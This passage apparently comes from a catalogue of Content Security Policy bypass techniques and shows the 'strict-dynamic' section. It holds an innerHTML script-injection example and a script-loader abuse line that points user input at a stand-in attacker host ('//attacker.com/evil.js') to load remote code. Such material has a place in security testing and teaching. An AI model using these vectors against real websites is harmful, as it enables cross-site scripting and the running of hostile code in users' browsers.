    </nonce_bypass>

    <strict_dynamic_bypass>
      {% raw %}
      # 'strict-dynamic' allows scripts created by trusted scripts
      # But has bypass vectors

      # If you control input to trusted script
      trustedScript.innerHTML = '<script>alert(1)</script>';
      document.body.appendChild(trustedScript.firstChild);

      # Script loader abuse
      # If trusted script loads other scripts based on input
      loadScript(userInput); // userInput = "//attacker.com/evil.js"
      {% endraw %}
    </strict_dynamic_bypass>

    <object_and_embed>
